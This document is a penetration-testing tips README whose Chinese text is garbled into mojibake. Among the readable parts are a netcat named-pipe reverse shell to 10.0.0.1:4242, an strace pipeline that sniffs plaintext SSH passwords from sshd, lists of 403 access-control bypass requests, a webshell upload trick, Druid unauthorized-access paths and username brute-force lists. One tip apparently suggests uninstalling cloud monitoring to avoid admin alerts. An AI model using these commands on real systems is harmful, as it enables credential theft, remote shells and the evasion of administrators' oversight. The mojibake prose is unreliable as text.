# Pentest101

æ¯å‘¨(ä¹Ÿè®¸ä¸)åˆ†äº«ä¸€äº›å…³äºæ¸—é€æµ‹è¯•çš„çŸ¥è¯†ç‚¹

---

æ— è®ºçº¢é˜Ÿè¿˜æ˜¯è“é˜Ÿ,å¹²æ´»ä¹‹å‰å…ˆè®©å®¢æˆ·ä¿å­˜å¥½æ—¥å¿—å’Œå¤‡ä»½.(åœ¨å•°å—¦æˆ‘ä¹Ÿè¦è¯´,è¡€çš„æ•™è®­)

---

åœ¨ linux ä¸­ä¸çŸ¥é“å½“å‰ç”¨æˆ·å¯ç”¨ä»€ä¹ˆå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼Œè¿™æ¡å‘½ä»¤å¯ä»¥åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„å‘½ä»¤(æœ‰ç‚¹æ‹—å£)
```
compgen -c
```

---

"Beacon.dll"ã€"beacon.x64.dll" å’Œ "ReflectiveLoader" é»˜è®¤æ˜¯ CS Beacon çš„ç¡¬ç¼–ç ç‰¹å¾ã€‚å½“å¯»æ‰¾å†…å­˜ä¸­çš„åé—¨æ—¶ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹

---

ç«ç»’æ‹¦æˆªæ‰«æï¼Œå¦‚ä½•å…³é—­æ‹¦æˆªï¼Ÿ
- ç«ç»’>ç½‘ç»œé˜²æŠ¤>åŸºç¡€é˜²æŠ¤ä¸­å…³é—­

![](./assets/img/1.png)

---

druid æœªæˆæƒè®¿é—®å¸¸è§è·¯å¾„
- /druid/websession.html
- /system/druid/websession.html
- /webpage/system/druid/websession.html

---

çˆ†ç ´ç›®æ ‡ç”¨æˆ·åæ—¶åº”è€ƒè™‘å¦‚ä¸‹å¯èƒ½ï¼š
- æ’åº“
- å¸¸è§æ‰‹æœºå·
- å¸¸è§ç™»å½•è´¦å·(adminã€managerã€testã€deme)
- æ•°å­—ç»„åˆ(0-9ã€00-99ã€000-999ã€0000-9999ã€00000-99999)
- æ‹¼éŸ³(zhangsanã€zhang.sanã€zhangs)
- ä¸­æ–‡(å¼ ä¸‰ã€æå››ã€å¼ san)
- è‹±æ–‡å(Tomã€Jeoã€Cherry)
- å•ä½å(zssx123ã€zssx@123)
- åœ°å(beijing123ã€beijing@123)
- ç»„åˆ(åœ°å+å•ä½å)
- åŸŸå(baidu@123ã€JD@123)
- ç”Ÿæ—¥ç»„åˆ

---

æ•´ç†å­—å…¸æ—¶ï¼Œæ¨èç”¨linuxä¸‹çš„å·¥å…·å¿«é€Ÿåˆå¹¶å’Œå»é‡
```bash
cat file1.txt file2.txt fileN.txt > out.txt
sort out.txt | uniq > out2.txt
```

---

ä¿¡æ¯æ”¶é›†å°æŠ€å·§ï¼Œä»”ç»†è§‚å¯Ÿç›®æ ‡é¡µé¢çš„jsè·¯å¾„ï¼Œå¤šæ‰¾å‡ ä¸ªjsç›®å½•ï¼Œä¸“é—¨ç”¨jså­—å…¸è¿›è¡Œçˆ†ç ´ï¼Œè·å–çš„jsè„šæœ¬åˆ—è¡¨ï¼Œå†è°ƒç”¨å·¥å…·å»åŒ¹é…è·¯å¾„å’Œå‡­è¯ã€‚

---

æœ‰æ—¶ä¸€äº›ä¸Šä¼ ç‚¹æ²¡æœ‰è¿‡æ»¤,ä½†ä½ è®¿é—®æ–‡ä»¶æ˜¯é€šè¿‡å‡½æ•°è°ƒç”¨è·å–æ–‡ä»¶,è¿™ä¸ªæ—¶å€™å¯ä»¥å…ˆæµ‹ä¸‹ä»»æ„æ–‡ä»¶è¯»,ç„¶åå°è¯•getæ”¹ä¸ºpoståœ¨æµ‹è¯•ä»»æ„æ–‡ä»¶è¯»,å¦‚æœå­˜åœ¨,å°è¯•é€šè¿‡ä»»æ„æ–‡ä»¶è¯»æ‰¾è·¯å¾„

---

æ‰“æŸä¸€ä¸ªè¡Œä¸šæƒ³è¦æœ‰æˆæœï¼Œæœ€å¥½è¦æ·±å…¥äº†è§£è¿™ä¸ªè¡Œä¸šï¼Œæˆ‘ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚æä¼ å¥‡/dnfè¿™ç§ç§æœçš„ï¼Œä»–ä»¬è®²ç®¡ç†å‘˜éƒ½å«gmï¼Œä¸åƒæITçš„å«adminï¼Œé‚£ä½ çˆ†ä¸€äº›ç§æœæ¸¸æˆçš„ç½‘é¡µåå°ã€ç®¡ç†è´¦å·å°±éœ€è¦æä¸€äº›è¡Œä¸šé»‘è¯ç”Ÿæˆä¸€ä¸‹ï¼Œæ¯”å¦‚/gm/æˆ–è€…/chongzhi/gm.php,ç”¨ITè¡Œä¸šçš„å­—å…¸ï¼Œæ°´åœŸä¸æœğŸ¤£ï¼Œè¿˜æœ‰è èœè¡Œä¸šï¼Œæ³¨å†Œç”¨æˆ·éœ€è¦6ä½é‚€è¯·ç ï¼Œå¾ˆå¤šéƒ½æ˜¯888888ã€666666è¿™ç§å‰åˆ©æ•°å­—ï¼Œé€†å‘ä¸€ä¸‹æ€è·¯ï¼ŒçŒœä¸€çŒœç›®æ ‡å—ä¼—å–œæ¬¢ä»€ä¹ˆã€‚

---

æˆ‘ä»¬åœ¨åæ¸—é€è¿‡ç¨‹ä¸­ç»å¸¸è¦ä¼  payload åˆ°ç›®æ ‡ï¼Œä¸´æ—¶èµ·çš„æ–‡ä»¶æœåŠ¡å™¨éƒ½æ˜¯ python ä¸€æ¡å‘½ä»¤çš„äº‹
- Python 2.x
    ```bash
    python -m SimpleHTTPServer 8000
    # åœ¨å½“å‰ç›®å½•èµ·ä¸ª 8000 ç«¯å£çš„ HTTP æœåŠ¡
    ```
- Python 3.x
    ```bash
    python -m http.server 8000
    ```
- æ¨èä¸€ä¸ªå¯ä»¥åŠ å¯†ç çš„ï¼Œä¸€æ¡å‘½ä»¤pythonæœåŠ¡å™¨æ¨¡å—
    ```
    pip3 install updog
    updog --port 8888 --password test1234
    ```

---

ä¸€èˆ¬æ¥è¯´,æŸäº›åœºæ™¯å¤šä¸ªæœåŠ¡æ˜¯ååŒçš„å…³ç³»,æ¯”å¦‚å°±è¿™ä¸ª LiveCMS æœåŠ¡ä¸€å®šå’Œä¸‹é¢çš„ç›‘æ§è®¾å¤‡æœ‰è¿æ¥ï¼Œä¸ç„¶æ—¥å¿—ä¸ä¼šè¿™ä¹ˆå¤§ï¼Œå¯ä»¥æä¸€æä¸‹çº§ç›‘æ§ï¼Œä¹Ÿå¯ä»¥ä¸“é—¨æä¸€æè¿™ä¸ª LiveCMS å’Œ LiveSMSã€LiveGBS è¯•è¯•
LiveCMS ç«¯å£ä½¿ç”¨
- TCP ç«¯å£ : 5060(SIP), 10000(HTTP), 26379(Redis)
- UDP ç«¯å£ : 5060(SIP)

LiveSMS : SIP æµåª’ä½“æœåŠ¡, æ ¹æ®éœ€è¦å¯éƒ¨ç½²å¤šå¥—
- TCP ç«¯å£ : 5070(SIP), 10001(HTTP), 11935(RTMP Live), 30000-40000(RTP over TCP)
- UDP ç«¯å£ : 5070(SIP), 50000-60000(RTP/RTCP over UDP)

---

æœ‰æ—¶å€™æˆ‘ä»¬æ‹¿äº†ä¸€å° docker æœºå™¨ï¼Œå‘ç°æ²¡æœ‰ ifconfig å‘½ä»¤ä¹Ÿæ²¡æœ‰ ip å‘½ä»¤ï¼Œä¸æ¸…æ¥šæ€ä¹ˆçœ‹ IPï¼Œè¿™æ—¶å€™å¯ä»¥é€šè¿‡æŸ¥çœ‹ proc æ–‡ä»¶çš„æ–¹å¼æ¥æŸ¥çœ‹
```bash
cat /proc/net/fib_trie
cat /etc/sysconfig/network
```

---

æ¸—é€æ—¶é‡åˆ°æŸäº›ä¸Šä¼ ç‚¹æœªä½œè¿‡æ»¤ï¼Œä½†è´Ÿè½½å‡è¡¡åšäº†è¿‡æ»¤åç¼€åçš„æƒ…å†µï¼Œå¯ä»¥ä¸Šä¼  webshell å‘½åä¸º index.phpï¼Œç„¶åè®¿é—® xxx.com/xxx/upload, å°è¯• bypass åä»£çš„ç­–ç•¥

---

å½“æ¸—é€æ—¶é‡åˆ°äº† 403 æˆ–è€… 302ã€401 çš„æ‹’ç»è®¿é—®ï¼Œä¸è¦æ€•ï¼Œå¤š FUZZ å‡ æ¬¡
- ä» HTTP Header å±‚é¢ bypass
    ```bash
    GET /admin HTTP/1.1
    Host: web.com   # ===> 403

    GET /anything HTTP/1.1
    Host: web.com
    X-Original-URL: /admin  # ===> 200

    GET /anything HTTP/1.1
    Host: web.com
    Referer: https://web.com/admin  # ===> 200

    GET https://qq.com HTTP/1.1
    Host: web.com   # ===> SSRF
    ```

- ä» URL å‚æ•°å±‚é¢ bypass
    ```bash
    /admin/panel    # ===> 403
    /admin/monitor  # ===> 200

    /admin/monitor/;panel   # ===> 302
    ```
    ```bash
    web.com/admin   # ===> 403

    web.com/ADMIN       # ===> 200
    web.com/admin/      # ===> 200
    web.com/admin/.     # ===> 200
    web.com//admin//    # ===> 200
    web.com/./admin/./  # ===> 200
    web.com/./admin/..  # ===> 200
    web.com/%2f/admin/  # ===> 200
    web.com/admin.json  # ===> 200(ruby)

    web.com/%2e/admin   # ===> 200
    web.com/%252e/admin # ===> 200
    web.com/%ef%bc%8fadmin  # ===> 200

    web.com/admin       # ===> 302
    web.com/admin..;/   # ===> 200
    ```

- ä»åè®®å±‚é¢ bypass
    ```bash
    http://web.com/admin    # ===> 403
    https://web.com/admin   # ===> 200
    ```

---

å½“æˆ‘ä»¬æ‹¿ä¸‹ windows æœºå™¨æ—¶å¯ä»¥é€šè¿‡æŠ“å†…å­˜ä¸­çš„å¯†ç è¿›è¡Œæ¨ªå‘ï¼Œä½† linux å´ä¸å¯èƒ½æŠ“åˆ°å†…å­˜ä¸­çš„å¯†ç ï¼Œä½†æ˜¯ Debian ç³»åˆ—ä¸‹çš„ linux ç³»ç»Ÿå¯ä»¥é€šè¿‡ç›‘å¬ sshd è¿›ç¨‹çš„æ•°æ®æŠ“å–å‡ºæ˜æ–‡å¯†ç ï¼Œæ¯”å¦‚ä½ æ‹¿ä¸‹äº†ä¸€å°ç®¡ç†å‘˜æœºå™¨ï¼Œä¸Šé¢ç”± xshellï¼Œä½ å¯ä»¥æ‰‹åŠ¨å¼€ä¸€ä¸ªç›‘å¬ï¼Œåœ¨å¼€ä¸€ä¸ªç™»å½•ï¼Œç›‘å¬çš„çª—å£ä¸Šå°±æŠ“å‡ºå¯†ç äº†
```bash
strace -xx -fp `cat /var/run/sshd.pid` 2>&1| grep --line-buffered -P 'write\(\d, "\\x00' | perl -lne '$|++; @F=/"\s*([^"]+)\s*"/g;for (@F){tr/\\x//d}; print for @F'|grep --line-buffered -oP '.{8}\K([2-7][0-9a-f])*$'|grep --line-buffered -v '^64$'|perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'
```

---

æ¸—é€æ—¶å°½é‡ä¸è¦æš´éœ²è‡ªå·±çš„ IP åœ°å€ï¼ŒæŒ‚ä»£ç†æ˜¯å¿…é¡»çš„
- linux ä¸‹è¦æŸ¥çœ‹è‡ªå·±ç»ˆç«¯æ˜¯å¦èµ°ä»£ç†å¯ä»¥ curl https://ifconfig.me/ çœ‹ä¸‹è¿”å›çš„ IP åœ°å€
- windows å°±ç›´æ¥è®¿é—® https://ifconfig.me/ å³å¯

---

linux ä¸‹ä»£ç†ä¸ç”¨å¤šè¯´, proxychains-ngï¼Œwindows ä¸‹æ¨èç”¨ Proxifier

---

MSF å’Œ CS ä¸­ Stage ä¸ Stageless çš„åŒºåˆ«
- Stage ï¼š å…ˆä¼ ä¸€ä¸ª shellcodeï¼Œç„¶åå›è¿ç«¯å£ï¼ŒåŠ è½½æ¶æ„ metsrvï¼Œç„¶åå†è¯·æ±‚ stdapi äº privï¼Œè¿›è¡Œä¸Šçº¿
- Stageless ï¼š å°† shellcodeã€metsrvã€stdapiã€priv æ‰“åŒ…ï¼Œä¸€æ¬¡æ€§ä¼ å®Œ
- å¦‚æœæƒ³è®© msf ç›´æ¥å›å¼¹åˆ° NCï¼Œé‚£ä¹ˆå¿…é¡»è¦ç”¨ stageless

---

åˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯ä¸æ˜¯è™šæ‹Ÿæœºã€å®¹å™¨
- windows
    - cmd : systeminfo
    - Powershell : get-wmiobject win32_computersystem | fl model
- linux
    ```bash
    lshw -class system | grep -i VM & grep -i virtual
    dmesg | grep -i VM & grep -i virtual
    dmidecode -s system-product-name
    ls /tmp
    systemd-detect-virt
    virt-what
    ls -alh /.dockerenv
    cat /proc/1/cgroup
    ```

---

msf æ¡†æ¶å…¶å®æœ‰è®¸å¤š UI ç•Œé¢çš„å·¥å…·, å¯ä»¥å¸®åŠ©ä¸ä¹ æƒ¯å‘½ä»¤è¡Œçš„æ¸—é€æµ‹è¯•äººå‘˜è¿›è¡Œæ¸—é€ï¼Œæˆ‘ä¸¾å‡ ä¸ªä¾‹å­
- https://github.com/FunnyWolf/Viper
- https://github.com/WayzDev/Kage

---

åœ¨è¿›è¡Œäº‘ä¸»æœºåæ¸—é€æ—¶ï¼Œå¦‚æœè§¦å‘æ•æ„Ÿæ“ä½œï¼Œä¼šæœ‰çŸ­ä¿¡æé†’åˆ°ç®¡ç†å‘˜æ‰‹æœºä¸Šï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥é…Œæƒ…è€ƒè™‘å¸è½½äº‘ä¸»æœºçš„ç›‘æ§ (æœ‰æ—¶ä½ ç”¨äº‘ä¸»æœºè£… SSR ä¼šæ— æ³•è¿æ¥ä¹Ÿæ˜¯è¿™ä¸ªåŸå› )

---

rlwrap å·¥å…·ï¼Œå¯ä»¥å®Œç¾è§£å†³å„ç±» shell ä¸­æ— æ³•ä¸Šä¸‹å·¦å³çš„é—®é¢˜

ä¾‹å¦‚ ï¼Œå›å¼¹äº† shellï¼Œæ‰‹è´±æŒ‰äº†ä¸Šï¼Œè¿™ç§æƒ…å†µ(æˆ‘æƒ³ä½ ä¸€å®šé‡åˆ°è¿‡ğŸ¤£ğŸ¤£ğŸ¤£ğŸ¤£)
- å®‰è£…ï¼š
    ```bash
    apt install rlwrap
    ```
- ä½¿ç”¨ï¼š
    ```bash
    rlwrap [Command]
    ```

---

cAdvisor æ˜¯ Google å‡ºå“çš„ç”¨äºç›‘æ§ Docker å®¹å™¨çš„æœåŠ¡ï¼Œæ¸—é€æ—¶é‡åˆ°è¿™ä¸ªæœåŠ¡åŸºæœ¬ä¸Šæ˜¯å­˜åœ¨å®¹å™¨ç¯å¢ƒ

---

æ–°ç‰ˆ kali 2020 ç‰ˆåä½¿ç”¨ root è´¦å·é»˜è®¤ä¸ç»™å¯†ç ï¼Œå¦‚æœä½ æƒ³,å¯ä»¥ç›´æ¥è¿›è¡Œä¿®æ”¹ : sudo passwd root

---

nc å…·æœ‰å¤šä¸ªç‰ˆæœ¬, æ¯”å¦‚: traditionalã€openbsdã€ncat
- traditional æœ€è€çš„ç‰ˆæœ¬,æ”¯æŒæœ€åŸºæœ¬çš„åŠŸèƒ½
- openbsd å®‰å…¨ç‰ˆæœ¬,å›å¼¹è¦ç”¨ä¸€å¤§æ®µå‘½ä»¤
    ```bash
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
    ```
- ncat æ–°ç‰ˆæœ¬, é‡æ„äº†æ—§ç‰ˆçš„ä»£ç å¹¶æ”¯æŒäº†è®¸å¤šæ–°åŠŸèƒ½, debian ç³»åˆ—å‘è¡Œç‰ˆä¸‹é€šè¿‡ä»¥ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…é…ç½®
    ```bash
    apt install -y ncat
    update-alternatives --set nc /usr/bin/ncat
    ```
